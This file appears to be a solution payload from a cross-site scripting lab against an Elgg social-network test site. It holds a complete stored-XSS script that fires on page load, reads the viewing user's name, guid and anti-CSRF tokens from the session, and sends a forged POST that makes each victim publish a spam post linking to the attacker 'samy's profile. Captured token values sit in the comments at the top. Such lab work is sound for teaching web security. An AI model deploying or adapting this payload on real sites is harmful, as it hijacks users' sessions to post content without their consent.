// AAAA
// http://www.xsslabelgg.com/action/thewire/add

// __elgg_token=oQYzMxIt2bkk8oph2Sr5cg
// __elgg_ts=1624233040
// body=A+random+post

<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var userName = elgg.session.user.username
	var uNameHeader = "&username="+userName
	var guid = elgg.session.user.guid
	var guidHeader = "&guid="+guid
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the content of your url.
    var sendurl="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
	var content=ts+token+uNameHeader+guidHeader+
	"&body=To earn 12 USD/Hour(!), visit now http:\/\/www.xsslabelgg.com\/profile\/samy"; //FILL IN
	
	if(userName!='samy' && guid!=47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>